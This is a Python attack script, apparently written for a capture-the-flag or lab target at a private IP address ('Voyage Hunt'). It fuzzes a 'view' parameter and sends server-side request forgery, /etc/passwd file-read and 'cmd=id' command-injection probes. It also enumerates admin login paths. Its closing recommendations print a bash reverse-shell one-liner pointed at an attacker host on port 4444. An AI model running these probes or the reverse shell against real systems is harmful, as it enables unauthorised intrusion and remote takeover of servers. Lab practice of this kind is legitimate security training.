#!/usr/bin/env python3
"""
Voyage Hunt - Deeper investigation of 'view' parameter
The view=category showed 49.5% response change
Let's dig deeper into this
"""

import requests
from bs4 import BeautifulSoup
import urllib.parse

TARGET = "http://10.82.166.188"

print("\n" + "="*60)
print("STEP 1: Test view parameter variations")
print("="*60)

# Test different view values
views = [
    "featured",  # default
    "category",  # already found 49.5% change
    "article",
    "form",
    "admin",
    "shell",
    "download",
    "preview",
    "fetch",
    "file",
    "render",
]

print("\n[*] Testing view parameter values...")
for view in views:
    try:
        url = f"{TARGET}/?view={view}"
        resp = requests.get(url, timeout=5)
        size = len(resp.text)
        size_diff = abs(size - 8026)  # baseline
        percent = (size_diff / 8026) * 100
        
        # Check for error messages or unusual content
        if "error" in resp.text.lower():
            print(f"[!] {view}: {size} bytes | {percent:.1f}% change | ERROR in response")
        elif size_diff > 1000:
            print(f"[!] {view}: {size} bytes | {percent:.1f}% change")
        else:
            print(f"[-] {view}: {size} bytes | {percent:.1f}% change")
            
    except Exception as e:
        print(f"[-] {view}: Error - {str(e)[:30]}")

print("\n" + "="*60)
print("STEP 2: Check view=category response in detail")
print("="*60)

try:
    resp = requests.get(f"{TARGET}/?view=category", timeout=5)
    
    # Save for analysis
    with open("voyage_view_category.html", "w") as f:
        f.write(resp.text)
    print(f"[+] Saved response to voyage_view_category.html ({len(resp.text)} bytes)")
    
    # Parse and look for forms, inputs, links
    soup = BeautifulSoup(resp.text, 'html.parser')
    
    # Check for forms
    forms = soup.find_all('form')
    print(f"\n[*] Forms found: {len(forms)}")
    for i, form in enumerate(forms):
        print(f"  Form {i+1}: {form.get('action')} ({form.get('method', 'GET')})")
        for inp in form.find_all('input'):
            print(f"    - {inp.get('name')}")
    
    # Check for input fields
    inputs = soup.find_all('input')
    print(f"\n[*] All input fields: {len(inputs)}")
    unique_inputs = {}
    for inp in inputs:
        name = inp.get('name')
        inp_type = inp.get('type', 'text')
        if name:
            unique_inputs[name] = inp_type
    
    for name, inp_type in sorted(unique_inputs.items()):
        print(f"  - {name} ({inp_type})")
    
    # Look for select/dropdown fields
    selects = soup.find_all('select')
    print(f"\n[*] Dropdown fields: {len(selects)}")
    for select in selects:
        print(f"  - {select.get('name')}")
        options = select.find_all('option')
        for opt in options:
            print(f"    → {opt.get('value')}: {opt.text}")
    
    # Look for suspicious keywords
    if any(x in resp.text.lower() for x in ['url', 'fetch', 'preview', 'render', 'image', 'download']):
        print(f"\n[+] Found suspicious keywords in response!")
    
except Exception as e:
    print(f"[-] Error: {e}")

print("\n" + "="*60)
print("STEP 3: Test view parameter with additional params")
print("="*60)

# Try combining view with other parameters
combinations = [
    ("view=category&url=http://127.0.0.1", "SSRF test"),
    ("view=category&file=/etc/passwd", "File read"),
    ("view=category&cmd=id", "Command injection"),
    ("view=category&fetch=http://127.0.0.1", "Fetch test"),
    ("view=category&image=http://127.0.0.1", "Image fetch"),
    ("view=category&render=http://127.0.0.1", "Render test"),
]

print("\n[*] Testing combinations...")
for param_combo, desc in combinations:
    try:
        url = f"{TARGET}/?{param_combo}"
        resp = requests.get(url, timeout=5)
        size = len(resp.text)
        
        # Check for command output
        if any(x in resp.text for x in ['uid=', 'gid=', 'groups=', 'root:', 'bin/']):
            print(f"[+++] {param_combo}: SUSPICIOUS OUTPUT DETECTED!")
            print(f"      {resp.text[max(0, resp.text.find('uid=')-20):resp.text.find('uid=')+80 if 'uid=' in resp.text else 0]}")
        elif size > 9000 or size < 7000:
            print(f"[!] {param_combo}: {size} bytes | Response size different")
    except:
        pass

print("\n" + "="*60)
print("STEP 4: Test administrator panel")
print("="*60)

admin_paths = [
    "/administrator",
    "/administrator/",
    "/administrator/index.php",
    "/admin",
    "/admin/",
]

for path in admin_paths:
    try:
        resp = requests.get(TARGET + path, timeout=5)
        print(f"[+] {path}: {resp.status_code}")
        if resp.status_code == 200:
            if 'login' in resp.text.lower() or 'admin' in resp.text.lower():
                print(f"    → Contains login/admin content")
    except:
        pass

print("\n" + "="*60)
print("Recommendations:")
print("="*60)
print("""
1. Check voyage_view_category.html for any preview/fetch/render features
2. If view=category has a form, look for parameters like:
   - url, file, image, fetch, render, download, preview
3. Try combining view=category with injection payloads
4. Manual reverse shell if injection found:
   bash -i >& /dev/tcp/10.2.36.59/4444 0>&1
""")
